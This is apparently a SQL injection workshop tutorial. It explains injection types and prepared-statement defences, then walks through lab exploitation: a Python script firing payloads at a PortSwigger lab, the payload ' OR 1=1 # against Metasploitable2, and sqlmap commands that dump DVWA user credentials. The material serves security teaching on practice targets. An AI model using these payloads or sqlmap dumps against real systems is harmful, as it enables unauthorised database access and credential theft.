# SQL Injection Vulnerability

## Agenda

- SQL Injection in a Nutshell. => (Let's Take a Look! ><)

  - What is SQL Injection?
  - What are the types of SQL Injection?
  - How to prevent SQL Injection?

- SQL Injection in Action => (Let's Hack It! ^^)

  - Practicing with PortSwigger SQL Injection Labs
    - Manual Exploitation via manipulating the URL
    - Writing a Python Script to automate the exploitation process
  - Exploit MetaSpoitable2 VM
    - Security Level 0 => (No Protection) ==> Manual Exploitation via entering the Payload in the input fields
    - Security Level 1 => (Basic Protection) ==> Bypass Frontend Validation with **Zap Proxy**
    - Security Level 2 => (Advanced Protection) ==> Show the secure code
  - Using SQL Map to make life easier
    - Setup Docker Container with Vulnerable Web Application
    - Exploit the Vulnerability with SQL Map
  - Solving CTF Challenges
    - PicoCTF SQL Injection
    - HackTheBox or TryHackMe Rooms

- Where should I go from here? => (Let's Learn More! ^\_^)
  - More Resources
    - Useful GitHub Repositories
    - Useful Cheat Sheets
    - Useful Articles
    - Useful Videos

---

## **Part 1: Let's Take a Look! ><**

### 1.1 What is SQL Injection?

SQL injection is a code injection technique, used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution (e.g. to dump the database contents to the attacker). SQL injection must exploit a security vulnerability in an application's software, for example, when user input is either incorrectly filtered for string literal escape characters embedded in SQL statements or user input is not strongly typed and unexpectedly executed. SQL injection is mostly known as an attack vector for websites but can be used to attack any type of SQL database.

### 1.2 What are the types of SQL Injection?

- In-band SQL Injection
- Inferential SQL Injection
- Blind SQL Injection
- Error-based SQL Injection
- Union-based SQL Injection
- Boolean-based SQL Injection
- Time-based SQL Injection

### 1.3 How to prevent SQL Injection?

You can prevent SQL injection by using prepared statements. Prepared statements are SQL statements that are compiled and stored in the database. This means that the database can parse the statement and check its syntax before it is executed. This prevents SQL injection because the parameters are escaped before the query is executed. The following example shows how to use prepared statements to prevent SQL injection:

```sql
SELECT * FROM users WHERE username = ? AND password = ?
-- Here the ? is a placeholder for the username and password values that will be passed to the query.
-- The database will escape any special chars in the values and then execute the query.
```

Here is an example of how to use prepared statements in PHP:

```php
<?php
// Create a prepared statement
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
// Get parameter values
$username = "admin";
$password = "password";
// Bind parameters to the query
$stmt->bind_param("ss", $username, $password);
// Execute the query
$stmt->execute();
// Get the result of the query
$result = $stmt->get_result();
// Do something with the result
?>
```

---

## **Part 2: Let's Hack It! ^^**

### 2.1 Practicing with [PortSwigger](https://portswigger.net/web-security/sql-injection) SQL Injection Labs

#### 2.1.1 Manual Exploitation via manipulating the URL

- [Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

#### 2.1.2 Writing a Python Script to automate the exploitation process

```python
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url, payload):
    uri = '/filter?category='
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    if "Cat Grin" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url, payload):
        print("[+] SQL injection successful!")
    else:
        print("[-] SQL injection unsuccessful!")
```

### 2.2 Exploit MetaSpoitable2 VM

#### 2.2.1 Security Level 0 => (No Protection) ==> Manual Exploitation via entering the Payload in the input fields

- MySQL Payload

```sql
' OR 1=1 #
```

#### 2.2.2 Security Level 1 => (Basic Protection) ==> Bypass Frontend Validation with **Zap Proxy**

- MySQL Payload

```sql
' OR 1=1 #
```

#### 2.2.3 Security Level 2 => (Advanced Protection) ==> Show the secure code

### 2.3 Using SQL Map to make life easier

#### 2.3.1 Setup Docker Container with Vulnerable Web Application

```bash
sudo apt install docker.io
sudo systemctl status docker
docker run -d -p 80:80 vulnerables/web-dvwa
docker ps
```

#### 2.3.2 Exploit the Vulnerability with SQL Map

```bash
# Getting the databases
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --dbs

# Getting the tables from the database
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -D dvwa --tables

# Getting the columns from the table
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -D dvwa -T users --columns

# Dumping the data from the table
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -D dvwa -T users -C user,password --dump
```

### 2.4 Solving CTF Challenges

#### 2.4.1 PicoCTF SQL Injection

- [SQL Injection](https://picoctf.org/practice-questions)

#### 2.4.2 HackTheBox || TryHackMe Rooms

- [HTB](https://www.hackthebox.eu/home/machines/profile/129)

- [THM](https://tryhackme.com/room/sqlinjection)

---

## ** Part 3: Let's Learn More! ^\_^**

### My Resources

- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
- [PicoCTF SQL Injection](https://picoctf.org/practice-questions)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [SQL Map Docs](https://github.com/sqlmapproject/sqlmap)
- [SQL Injection Cheat Sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)

# Made with 💚 by Khaders
